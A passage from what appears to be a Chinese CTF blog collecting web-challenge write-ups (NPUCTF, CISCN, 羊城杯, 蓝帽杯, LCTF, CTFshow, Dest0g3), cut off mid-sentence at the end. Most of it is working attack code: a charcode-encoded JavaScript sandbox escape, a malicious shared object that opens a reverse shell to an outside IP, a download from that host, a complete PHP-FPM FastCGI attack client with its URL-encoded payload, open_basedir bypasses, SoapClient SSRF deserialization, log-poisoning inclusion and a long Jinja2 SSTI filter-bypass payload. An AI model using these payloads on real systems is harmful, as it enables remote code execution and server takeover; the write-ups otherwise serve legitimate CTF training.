之前)，当 Buffer 的构造函数传入数字时, 会得到与数字长度一致的一个 Buffer，并且这个 Buffer 是未清零的。8.0 之后的版本可以通过另一个函数 Buffer.allocUnsafe(size) 来获得未清空的内存。 \n\n该题环境是8.0前，我们直接使用Buffer读取内存内容即可\n\n```python\nimport requests\nimport time\nurl = 'http://39115099-9d08-4235-a5d8-300bf6b9ad57.node4.buuoj.cn:81/?data=Buffer(500)'\nresponse = ''\nwhile 'flag' not in response:\n        req = requests.get(url)\n        response = req.text\n        print(req.status_code)\n        time.sleep(0.1)\n        if 'flag{' in response:\n            print(response)\n            break\n```\n\n## [NPUCTF2020]验证🐎\n\n给了源码，就不放了，直接看关键，首先是一个md5绕过，利用js弱类型相加、\n\n```\n[1]+'1' //'11'\n'1'+'1' //'11'\n[1]!=='1'\n```\n\n```\nif (first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0]))\n```\n\n然后就是传入的内容\n\n```javascript\nfunction saferEval(str) {\n  if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&|^%<>=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, '')) {\n    return null;\n  }\n  return eval(str);\n}\n```\n\n这里正则会发现可用函数只有Math，此处使用尖头函数加原型来执行\n\n```\nfunction (x) {\n    return x * x;\n}\n该函数使用箭头函数可以使用仅仅一行代码搞定！\nx => x * x\n```\n\n此处取Math原型可得到Function\n\n```\nMath.constructor.constructor\n```\n\n又因为不能直接传入命令执行，使用String中的String.fromCharCode()来将数字转换成字符串，再利用js中弱类型相加构造出字符串类，构造出如下payload\n\n```javascript\n(Math=>\n        (Math=Math.constructor,//此处类型为ƒ String() { [native code] }\n                Math.x=Math.constructor(\n  \t\t\t\t\t\t\t//此处类型为ƒ Function() { [native code] }，生成一个匿名函数\n                    Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,\n                        99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,\n                        46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,\n                        95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,\n                        121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()\n        )\n)(Math+1)\n```\n\n同时使用了箭头函数和自调用函数，+1将Math转换为String类型传入，而后通过Function构造出一个函数并进行自调用来将返回值传入Math.x，最终的返回值也就是Math.x的值\n\n## [CISCN2021 Quals]upload\n\n俩文件，一个upload，一个example\n\n```php\n//upload\n<?php\nif (!isset($_GET[\"ctf\"])) {\n    highlight_file(__FILE__);\n    die();\n}\n\nif(isset($_GET[\"ctf\"]))\n    $ctf = $_GET[\"ctf\"];\n\nif($ctf==\"upload\") {\n    if ($_FILES['postedFile']['size'] > 1024*512) {\n        die(\"这么大个的东西你是想d我吗？\");\n    }\n    $imageinfo = getimagesize($_FILES['postedFile']['tmp_name']);\n    if ($imageinfo === FALSE) {\n        die(\"如果不能好好传图片的话就还是不要来打扰我了\");\n    }\n    if ($imageinfo[0] !== 1 && $imageinfo[1] !== 1) {\n        die(\"东西不能方方正正的话就很讨厌\");\n    }\n    $fileName=urldecode($_FILES['postedFile']['name']);\n    if(stristr($fileName,\"c\") || stristr($fileName,\"i\") || stristr($fileName,\"h\") || stristr($fileName,\"ph\")) {\n        die(\"有些东西让你传上去的话那可不得了\");\n    }\n    $imagePath = \"image/\" . mb_strtolower($fileName);\n    if(move_uploaded_file($_FILES[\"postedFile\"][\"tmp_name\"], $imagePath)) {\n        echo \"upload success, image at $imagePath\";\n    } else {\n        die(\"传都没有传上去\");\n    }\n}\n```\n\n```php\n//example\n<?php\nif (!isset($_GET[\"ctf\"])) {\n    highlight_file(__FILE__);\n    die();\n}\n\nif(isset($_GET[\"ctf\"]))\n    $ctf = $_GET[\"ctf\"];\n\nif($ctf==\"poc\") {\n    $zip = new \\ZipArchive();\n    $name_for_zip = \"example/\" . $_POST[\"file\"];\n    if(explode(\".\",$name_for_zip)[count(explode(\".\",$name_for_zip))-1]!==\"zip\") {\n        die(\"要不咱们再看看？\");\n    }\n    if ($zip->open($name_for_zip) !== TRUE) {\n        die (\"都不能解压呢\");\n    }\n\n    echo \"可以解压，我想想存哪里\";\n    $pos_for_zip = \"/tmp/example/\" . md5($_SERVER[\"REMOTE_ADDR\"]);\n    $zip->extractTo($pos_for_zip);\n    $zip->close();\n    unlink($name_for_zip);\n    $files = glob(\"$pos_for_zip/*\");\n    foreach($files as $file){\n        if (is_dir($file)) {\n            continue;\n        }\n        $first = imagecreatefrompng($file);\n        $size = min(imagesx($first), imagesy($first));\n        $second = imagecrop($first, ['x' => 0, 'y' => 0, 'width' => $size, 'height' => $size]);\n        if ($second !== FALSE) {\n            $final_name = pathinfo($file)[\"basename\"];\n            imagepng($second, 'example/'.$final_name);\n            imagedestroy($second);\n        }\n        imagedestroy($first);\n        unlink($file);\n    }\n}\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## [羊城杯 2020]Blackcat\n\n音频最后有源码\n\n```\n<?php\ninclude \"initialized.php\";\nputenv(\"clandestine=\".randomkeys());\nif(empty($_POST['Black-Cat-Sheriff']) || empty($_POST['One-ear'])){\n    die('谁！竟敢踩我一只耳的尾巴！');\n}\n$clandestine = getenv(\"clandestine\");\nif(isset($_POST['White-cat-monitor']))\n    $clandestine = hash_hmac('sha256', $_POST['White-cat-monitor'], $clandestine);\n$hh = hash_hmac('sha256', $_POST['One-ear'], $clandestine);\nif($hh !== $_POST['Black-Cat-Sheriff']){\n    die('有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。');\n}\necho exec(\"nc\".$_POST['One-ear']);\n?>\n```\n\nhash_hmac函数如果传入的参数为数字会返回false，那么就可以控制$clandestine为false，进而控制哈希值让命令执行\n\n## [蓝帽杯 2021]One Pointer PHP\n\n给了源码\n\n```php\n<?php\ninclude \"user.php\";\nif($user=unserialize($_COOKIE[\"data\"])){\n\t$count[++$user->count]=1;\n\tif($count[]=1){\n\t\t$user->count+=1;\n\t\tsetcookie(\"data\",serialize($user));\n\t}else{\n\t\teval($_GET[\"backdoor\"]);\n\t}\n}else{\n\t$user=new User;\n\t$user->count=1;\n\tsetcookie(\"data\",serialize($user));\n}\n?>\n```\n\nPHP整数溢出\n\n> 如果给定的一个整数超出了整型（integer）的范围，将会被解释为浮点型（float）。同样如果执行的运算结果超出了整型（integer）范围，也会返回浮点型（float）。\n>\n\n构造一个conut超出int就能让判断为false，执行命令\n\n```\nO:4:\"User\":1:{s:5:\"count\";i:9223372036854775806;}\n```\n\n看phpinfo，ban大量命令，并且设置了open_basedir，那么先绕过这个吧\n\n```php\nmkdir(\"s\");\nchdir('s');\nini_set('open_basedir','..');\nchdir('..');\nchdir('..');\nchdir('..');\nchdir('..');\nini_set('open_basedir','/');\nreadfile('/flag')\n```\n\n没权限读啊，试试读一下cmdline，和nginx配置文件\n\n```shell\nphp-fpm: pool www\n```\n\n是phpfpm，可以利用SSRF，读取phpfpm的配置文件\n\n```\nlisten = 127.0.0.1:9001\n```\n\n在9001端口，下一步就是SSRF了\n\n> ### SSRF攻击FPM\n>\n> 我们可以通过SSRF来攻击FPM，但是受限于这道题的disable_functions，我们无法直接SSRF，但是可以利用`file_put_contents()`的一个特性来实现SSRF：\n>\n> `file_put_contents`在使用 ftp 协议时, 会将 data 的内容上传到 ftp 服务器, 由于上面说的`pasv`模式下, 服务器的地址和端口是可控, 我们可以将地址和端口指到`127.0.0.1:9000`.同时由于 ftp 的特性,不会有任何的多余内容, 类似`gopher`协议, 会将`data`原封不动的发给`127.0.0.1:9000`, 完美符合攻击fastcgi(FPM)的要求.\n\n首先编写一个恶意so文件\n\n```C\n#define _GNU_SOURCE\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\n\n__attribute__ ((__constructor__)) void preload (void){\n    system(\"bash -c 'exec bash -i &>/dev/tcp/45.15.131.101/6666 <&1'\");\n}\n```\n\n然后让靶机下载`var_dump(copy('http://45.15.131.101:5111/1.so','/var/www/html/1.so'));`\n\n下一步就是出发SSRF攻击FPM挂载so文件来RCE，下面是脚本\n\n```php\n<?php\n/**\n * Note : Code is released under the GNU LGPL\n *\n * Please do not change the header of this file\n *\n * This library is free software; you can redistribute it and/or modify it under the terms of the GNU\n * Lesser General Public License as published by the Free Software Foundation; either version 2 of\n * the License, or (at your option) any later version.\n *\n * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;\n * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n *\n * See the GNU Lesser General Public License for more details.\n */\n/**\n * Handles communication with a FastCGI application\n *\n * @author      Pierrick Charron <pierrick@webstart.fr>\n * @version     1.0\n */\nclass FCGIClient\n{\n    const VERSION_1            = 1;\n    const BEGIN_REQUEST        = 1;\n    const ABORT_REQUEST        = 2;\n    const END_REQUEST          = 3;\n    const PARAMS               = 4;\n    const STDIN                = 5;\n    const STDOUT               = 6;\n    const STDERR               = 7;\n    const DATA                 = 8;\n    const GET_VALUES           = 9;\n    const GET_VALUES_RESULT    = 10;\n    const UNKNOWN_TYPE         = 11;\n    const MAXTYPE              = self::UNKNOWN_TYPE;\n    const RESPONDER            = 1;\n    const AUTHORIZER           = 2;\n    const FILTER               = 3;\n    const REQUEST_COMPLETE     = 0;\n    const CANT_MPX_CONN        = 1;\n    const OVERLOADED           = 2;\n    const UNKNOWN_ROLE         = 3;\n    const MAX_CONNS            = 'MAX_CONNS';\n    const MAX_REQS             = 'MAX_REQS';\n    const MPXS_CONNS           = 'MPXS_CONNS';\n    const HEADER_LEN           = 8;\n    /**\n     * Socket\n     * @var Resource\n     */\n    private $_sock = null;\n    /**\n     * Host\n     * @var String\n     */\n    private $_host = null;\n    /**\n     * Port\n     * @var Integer\n     */\n    private $_port = null;\n    /**\n     * Keep Alive\n     * @var Boolean\n     */\n    private $_keepAlive = false;\n    /**\n     * Constructor\n     *\n     * @param String $host Host of the FastCGI application\n     * @param Integer $port Port of the FastCGI application\n     */\n    public function __construct($host, $port = 9001) // and default value for port, just for unixdomain socket\n    {\n        $this->_host = $host;\n        $this->_port = $port;\n    }\n    /**\n     * Define whether or not the FastCGI application should keep the connection\n     * alive at the end of a request\n     *\n     * @param Boolean $b true if the connection should stay alive, false otherwise\n     */\n    public function setKeepAlive($b)\n    {\n        $this->_keepAlive = (boolean)$b;\n        if (!$this->_keepAlive && $this->_sock) {\n            fclose($this->_sock);\n        }\n    }\n    /**\n     * Get the keep alive status\n     *\n     * @return Boolean true if the connection should stay alive, false otherwise\n     */\n    public function getKeepAlive()\n    {\n        return $this->_keepAlive;\n    }\n    /**\n     * Create a connection to the FastCGI application\n     */\n    private function connect()\n    {\n        if (!$this->_sock) {\n            //$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);\n            $this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);\n            if (!$this->_sock) {\n                throw new Exception('Unable to connect to FastCGI application');\n            }\n        }\n    }\n    /**\n     * Build a FastCGI packet\n     *\n     * @param Integer $type Type of the packet\n     * @param String $content Content of the packet\n     * @param Integer $requestId RequestId\n     */\n    private function buildPacket($type, $content, $requestId = 1)\n    {\n        $clen = strlen($content);\n        return chr(self::VERSION_1)         /* version */\n            . chr($type)                    /* type */\n            . chr(($requestId >> 8) & 0xFF) /* requestIdB1 */\n            . chr($requestId & 0xFF)        /* requestIdB0 */\n            . chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */\n            . chr($clen & 0xFF)             /* contentLengthB0 */\n            . chr(0)                        /* paddingLength */\n            . chr(0)                        /* reserved */\n            . $content;                     /* content */\n    }\n    /**\n     * Build an FastCGI Name value pair\n     *\n     * @param String $name Name\n     * @param String $value Value\n     * @return String FastCGI Name value pair\n     */\n    private function buildNvpair($name, $value)\n    {\n        $nlen = strlen($name);\n        $vlen = strlen($value);\n        if ($nlen < 128) {\n            /* nameLengthB0 */\n            $nvpair = chr($nlen);\n        } else {\n            /* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */\n            $nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);\n        }\n        if ($vlen < 128) {\n            /* valueLengthB0 */\n            $nvpair .= chr($vlen);\n        } else {\n            /* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */\n            $nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);\n        }\n        /* nameData & valueData */\n        return $nvpair . $name . $value;\n    }\n    /**\n     * Read a set of FastCGI Name value pairs\n     *\n     * @param String $data Data containing the set of FastCGI NVPair\n     * @return array of NVPair\n     */\n    private function readNvpair($data, $length = null)\n    {\n        $array = array();\n        if ($length === null) {\n            $length = strlen($data);\n        }\n        $p = 0;\n        while ($p != $length) {\n            $nlen = ord($data{$p++});\n            if ($nlen >= 128) {\n                $nlen = ($nlen & 0x7F << 24);\n                $nlen |= (ord($data{$p++}) << 16);\n                $nlen |= (ord($data{$p++}) << 8);\n                $nlen |= (ord($data{$p++}));\n            }\n            $vlen = ord($data{$p++});\n            if ($vlen >= 128) {\n                $vlen = ($nlen & 0x7F << 24);\n                $vlen |= (ord($data{$p++}) << 16);\n                $vlen |= (ord($data{$p++}) << 8);\n                $vlen |= (ord($data{$p++}));\n            }\n            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);\n            $p += ($nlen + $vlen);\n        }\n        return $array;\n    }\n    /**\n     * Decode a FastCGI Packet\n     *\n     * @param String $data String containing all the packet\n     * @return array\n     */\n    private function decodePacketHeader($data)\n    {\n        $ret = array();\n        $ret['version']       = ord($data{0});\n        $ret['type']          = ord($data{1});\n        $ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});\n        $ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});\n        $ret['paddingLength'] = ord($data{6});\n        $ret['reserved']      = ord($data{7});\n        return $ret;\n    }\n    /**\n     * Read a FastCGI Packet\n     *\n     * @return array\n     */\n    private function readPacket()\n    {\n        if ($packet = fread($this->_sock, self::HEADER_LEN)) {\n            $resp = $this->decodePacketHeader($packet);\n            $resp['content'] = '';\n            if ($resp['contentLength']) {\n                $len  = $resp['contentLength'];\n                while ($len && $buf=fread($this->_sock, $len)) {\n                    $len -= strlen($buf);\n                    $resp['content'] .= $buf;\n                }\n            }\n            if ($resp['paddingLength']) {\n                $buf=fread($this->_sock, $resp['paddingLength']);\n            }\n            return $resp;\n        } else {\n            return false;\n        }\n    }\n    /**\n     * Get Informations on the FastCGI application\n     *\n     * @param array $requestedInfo information to retrieve\n     * @return array\n     */\n    public function getValues(array $requestedInfo)\n    {\n        $this->connect();\n        $request = '';\n        foreach ($requestedInfo as $info) {\n            $request .= $this->buildNvpair($info, '');\n        }\n        fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));\n        $resp = $this->readPacket();\n        if ($resp['type'] == self::GET_VALUES_RESULT) {\n            return $this->readNvpair($resp['content'], $resp['length']);\n        } else {\n            throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');\n        }\n    }\n    /**\n     * Execute a request to the FastCGI application\n     *\n     * @param array $params Array of parameters\n     * @param String $stdin Content\n     * @return String\n     */\n    public function request(array $params, $stdin)\n    {\n        $response = '';\n//        $this->connect();\n        $request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));\n        $paramsRequest = '';\n        foreach ($params as $key => $value) {\n            $paramsRequest .= $this->buildNvpair($key, $value);\n        }\n        if ($paramsRequest) {\n            $request .= $this->buildPacket(self::PARAMS, $paramsRequest);\n        }\n        $request .= $this->buildPacket(self::PARAMS, '');\n        if ($stdin) {\n            $request .= $this->buildPacket(self::STDIN, $stdin);\n        }\n        $request .= $this->buildPacket(self::STDIN, '');\n        echo('?file=ftp://ip:9999/&data='.urlencode($request));\n//        fwrite($this->_sock, $request);\n//        do {\n//            $resp = $this->readPacket();\n//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {\n//                $response .= $resp['content'];\n//            }\n//        } while ($resp && $resp['type'] != self::END_REQUEST);\n//        var_dump($resp);\n//        if (!is_array($resp)) {\n//            throw new Exception('Bad request');\n//        }\n//        switch (ord($resp['content']{4})) {\n//            case self::CANT_MPX_CONN:\n//                throw new Exception('This app can\\'t multiplex [CANT_MPX_CONN]');\n//                break;\n//            case self::OVERLOADED:\n//                throw new Exception('New request rejected; too busy [OVERLOADED]');\n//                break;\n//            case self::UNKNOWN_ROLE:\n//                throw new Exception('Role value not known [UNKNOWN_ROLE]');\n//                break;\n//            case self::REQUEST_COMPLETE:\n//                return $response;\n//        }\n    }\n}\n?>\n<?php\n// real exploit start here\n//if (!isset($_REQUEST['cmd'])) {\n//    die(\"Check your input\\n\");\n//}\n//if (!isset($_REQUEST['filepath'])) {\n//    $filepath = __FILE__;\n//}else{\n//    $filepath = $_REQUEST['filepath'];\n//}\n\n$filepath = \"/var/www/html/add_api.php\";\n$req = '/'.basename($filepath);\n$uri = $req .'?'.'command=whoami';\n$client = new FCGIClient(\"unix:///var/run/php-fpm.sock\", -1);\n$code = \"<?php system(\\$_REQUEST['command']); phpinfo(); ?>\"; \n$php_value = \"unserialize_callback_func = system\\nextension_dir = /var/www/html\\nextension = 1.so\\ndisable_classes = \\ndisable_functions = \\nallow_url_include = On\\nopen_basedir = /\\nauto_prepend_file = \";   //注意修改这里的so文件名称和路径\n$params = array(\n    'GATEWAY_INTERFACE' => 'FastCGI/1.0',\n    'REQUEST_METHOD'    => 'POST',\n    'SCRIPT_FILENAME'   => $filepath,\n    'SCRIPT_NAME'       => $req,\n    'QUERY_STRING'      => 'command=whoami',\n    'REQUEST_URI'       => $uri,\n    'DOCUMENT_URI'      => $req,\n#'DOCUMENT_ROOT'     => '/',\n    'PHP_VALUE'         => $php_value,\n    'SERVER_SOFTWARE'   => '80sec/wofeiwo',\n    'REMOTE_ADDR'       => '127.0.0.1',\n    'REMOTE_PORT'       => '9001',    // 注意这里的FPM端口\n    'SERVER_ADDR'       => '127.0.0.1',\n    'SERVER_PORT'       => '80',\n    'SERVER_NAME'       => 'localhost',\n    'SERVER_PROTOCOL'   => 'HTTP/1.1',\n    'CONTENT_LENGTH'    => strlen($code)\n);\n// print_r($_REQUEST);\n// print_r($params);\n//echo \"Call: $uri\\n\\n\";\necho $client->request($params, $code).\"\\n\";\n?>\n```\n\n生成payload后访问\n\n```\nhack.php?file=ftp://45.15.131.101:9999/&data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00\n```\n\n反弹shell成功，提权，查看有suid的命令\n\n```shell\nfind / -perm -u=s -type f 2>/dev/null\n/bin/mount\n/bin/su\n/bin/umount\n/usr/bin/chfn\n/usr/bin/chsh\n/usr/bin/gpasswd\n/usr/bin/newgrp\n/usr/bin/passwd\n/usr/local/bin/php\n```\n\n用php命令行模式，同样先绕过open_basedir，再readfile读取flag即可\n\n## bestphp's revenge\n\n上来就是一个源码\n\n```php\n<?php\nhighlight_file(__FILE__);\n$b = 'implode';\ncall_user_func($_GET['f'], $_POST);\nsession_start();\nif (isset($_GET['name'])) {\n    $_SESSION['name'] = $_GET['name'];\n}\nvar_dump($_SESSION);\n$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');\ncall_user_func($b, $a);//此处如果不更改$b那么就会直接将$a合并为字符串然后返回\n?>\n//还有一个flag.php\nsession_start();\necho 'only localhost can get flag!';\n$flag = 'LCTF{*************************}';\nif($_SERVER[\"REMOTE_ADDR\"]===\"127.0.0.1\"){\n       $_SESSION['flag'] = $flag;\n   }\nonly localhost can get flag!\n```\n\n明显是SSRF了，[[HFCTF2020]BabyUpload](https://jlan.darkflow.top/posts/210d3ac7.html#HFCTF2020-BabyUpload)这里有php的session存储引擎相关内容，php中默认使用的是PHP引擎，修改引擎使用`ini_set('session.serialize_handler', '需要设置的引擎');`即可修改，此处我们通过不同的session存储读取方法即可导致反序列化，而SSRF只需要通过原生类中的`SoapClient`类反序列化执行`__call`方法就行\n\n首先构造`SoapClient`类\n\n```php\n<?php\n$url = \"http://127.0.0.1/flag.php\";\n$b = new SoapClient(null, array('uri' => $url, 'location' => $url));\n$a = serialize($b);\n$a = str_replace('^^', \"\\r\\n\", $a);\necho \"|\" . urlencode($a);\n?>\n```\n\n然后上传，使得反序列化被执行\n\n```\n/?f=session_start&name=|O%3A10%3A%22SoapClient%22%3A3%3A%7Bs%3A3%3A%22uri%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D\nserialize_handler=php_serialize\n```\n\n调用类中不存在的方法触发`__call`\n\n```\n/?f=extract&name=SoapClient\nb=call_user_func\n```\n\nvar_dump查看SESSIONID，最终改Cookie拿flag\n\n"},{"title":"CTFshow黑盒测试","url":"/posts/c8094d2d.html","content":"\n**380**\n\n扫目录扫除page.php文件\n\n打开提示文件不存在，传参包含flag.php\n\n**381**\n\n```\n打开page_$id.php失败\n```\n\n这次变了，目录穿越能拿到源码，但没有什么用，回首页发现css文件路径很奇怪，访问得到flag\n\n**382**\n\n同上题目录，不过需要登录，万能密码即可\n\n**383**\n\n同上\n\n**384**\n\n提示：`密码前2位是小写字母，后三位是数字`\n\n爆破咯，结果是xy123\n\n"},{"title":"Dest0g3 520迎新赛","url":"/posts/41a3f068.html","content":"\n## phpdest\n\n包含log文件改User-Agent\n\n```\npayload:\n?file=/var/log/nginx/access.log\n\nUser-Agent: <?php var_dump($flag);?>\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011423203.png)\n\n\n\n## EasyPHP\n\n```php\n<?php\nhighlight_file(__FILE__);\ninclude \"fl4g.php\";\n$dest0g3 = $_POST['ctf'];\n$time = date(\"H\");\n$timme = date(\"d\");\n$timmme = date(\"i\");\nif(($time > \"24\") or ($timme > \"31\") or ($timmme > \"60\")){\n    echo $fl4g;\n}else{\n    echo \"Try harder!\";\n}\nset_error_handler(\n    function() use(&$fl4g) {\n        print $fl4g;\n    }\n);\n$fl4g .= $dest0g3;\n?>\n```\n\ntime条件是不可能满足了，看下面的自定义错误函数，只需要让程序产生错误就行，.运算用于拼接字符串，传入数组即可\n\n```\npayload:\nPOST\nctf[]=1\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011423502.png)\n\n## SimpleRCE\n\nglob协议得到文件名，再使用fopen打开文件，fread读取内容\n\n```\npayload:\nPOST\naaa=echo(fread(fopen(end(glob('/f*')),'r'),100));\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011423683.png)\n\n## EasySSTI\n\n先给个一次性payload\n\n```\nusername={%25set%0dpoint=config|string|truncate(4)|last%25}\n{%25set%0dcxhx=config|join|truncate(28)|replace(point,wu)|last%25}\n{%25set%0dca=config|join|truncate(23)|replace(point,wu)|last|lower%25}\n{%25set%0dcb=config|join|truncate(9)|replace(point,wu)|last|lower%25}\n{%25set%0dcc=config|join|truncate(31)|replace(point,wu)|last|lower%25}\n{%25set%0dcd=config|join|truncate(7)|replace(point,wu)|last|lower%25}\n{%25set%0dce=config|join|truncate(4)|replace(point,wu)|last|lower%25}\n{%25set%0dcf=config|join|truncate(98)|replace(point,wu)|last|lower%25}\n{%25set%0dcg=config|join|truncate(11)|replace(point,wu)|last|lower%25}\n{%25set%0dch=config|join|truncate(203)|replace(point,wu)|last|lower%25}\n{%25set%0dci=config|join|truncate(16)|replace(point,wu)|last|lower%25}\n{%25set%0dcj=config|join|truncate(429)|replace(point,wu)|last|lower%25}\n{%25set%0dck=config|join|truncate(75)|replace(point,wu)|last|lower%25}\n{%25set%0dcl=config|join|truncate(96)|replace(point,wu)|last|lower%25}\n{%25set%0dcm=config|join|truncate(81)|replace(point,wu)|last|lower%25}\n{%25set%0dcn=config|join|truncate(5)|replace(point,wu)|last|lower%25}\n{%25set%0dco=config|join|truncate(21)|replace(point,wu)|last|lower%25}\n{%25set%0dcp=config|join|truncate(19)|replace(point,wu)|last|lower%25}\n{%25set%0dcq=config|join|truncate(294)|replace(point,wu)|last|lower%25}\n{%25set%0dcr=config|join|truncate(20)|replace(point,wu)|last|lower%25}\n{%25set%0dcs=config|join|truncate(14)|replace(point,wu)|last|lower%25}\n{%25set%0dct=config|join|truncate(12)|replace(point,wu)|last|lower%25}\n{%25set%0dcu=config|join|truncate(10)|replace(point,wu)|last|lower%25}\n{%25set%0dcv=config|join|truncate(6)|replace(point,wu)|last|lower%25}\n{%25set%0dcx=config|join|truncate(30)|replace(point,wu)|last|lower%25}\n{%25set%0dcy=config|join|truncate(77)|replace(point,wu)|last|lower%25}\n{%25set%0dcz=config|join|truncate(533)|replace(point,wu)|last|lower%25}\n{%25set%0dglo=cxhx%2Bcxhx%2Bcg%2Bcl%2Bco%2Bcb%2Bca%2Bcl%2Bcs%2Bcxhx%2Bcxhx%25}\n{%25set%0dcla=cxhx%2Bcxhx%2Bcc%2Bcl%2Bca%2Bcs%2Bcs%2Bcxhx%2Bcxhx%25}\n{%25set%0dooo=lipsum|attr(glo)|attr(cp%2Bco%2Bcp)(co%2Bcs)%25}\n{%25set%0da1=config|string|truncate(300)|replace(point,wu)|list%25}\n{{a1|attr(cp%2Bco%2Bcp)()}}\n{{a1|attr(cp%2Bco%2Bcp)()}}\n{%25set%0dgang=a1|attr(cp%2Bco%2Bcp)()%25}\n{%25set%0da2=config|list|string|truncate(20)|replace(point,wu)|list%25}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{{a2|attr(cp%2Bco%2Bcp)()}}\n{%25set%0dspace=a2|attr(cp%2Bco%2Bcp)()%25}\n{{ooo|attr(cp%2Bco%2Bcp%2Bce%2Bcn)(cc%2Bca%2Bct%2Bspace%2Bgang%2Bcf%2Bcl%2Bca%2Bcg)|attr(cr%2Bce%2Bca%2Bcd)()}}\n```\n\nban的真多////////////\n\n一个获取所有字母的小脚本\n\n```python\nstr=\"ENVDEBUGTESTINGPROPAGATE_EXCEPTIONSPRESERVE_CONTEXT_ON_EXCEPTIONSECRET_KEYPERMANENT_SESSION_LIFETIMEUSE_X_SENDFILESERVER_NAMEAPPLICATION_ROOTSESSION_COOKIE_NAMESESSION_COOKIE_DOMAINSESSION_COOKIE_PATHSESSION_COOKIE_HTTPONLYSESSION_COOKIE_SECURESESSION_COOKIE_SAMESITESESSION_REFRESH_EACH_REQUESTMAX_CONTENT_LENGTHSEND_FILE_MAX_AGE_DEFAULTTRAP_BAD_REQUEST_ERRORSTRAP_HTTP_EXCEPTIONSEXPLAIN_TEMPLATE_LOADINGPREFERRED_URL_SCHEMEJSON_AS_ASCIIJSON_SORT_KEYSJSONIFY_PRETTYPRINT_REGULARJSONIFY_MIMETYPETEMPLATES_AUTO_RELOADMAX_COOKIE_SIZE\"\nfor i in \"abcdefghijklmnopqrstuvwxyz\":\n    kkk=0\n    for j in str:\n        if i==j.lower():\n            print(j)\n            ini=str.find(j)+4\n            print(f\"字符{i}：set%0dc{i}=config|join|truncate({ini})|replace(point,wu)|last|lower\")\n            break\n```\n\n使用做出的字符变量拼接使用，反复使用pop直到拿到自己想要的字符，最后将os模块pop出进行使用（这也导致了这个payload只能一次性使用，使用一次破坏一次环境）\n\n## funny_upload\n\n.htaccess解析漏洞\n\n先构造htaccess文件内容\n\n```\nAddType application/x-httpd-php .png\n```\n\n上传图片发现确实被以php文件解析了，而后尝试构造图片马，最终发现`<?`被过滤，尝试各种标签（php7不支持）绕过无果，00%截断无果，查询得知htaccess也有类似.user.ini的文件包含功能`php_value auto_append_file  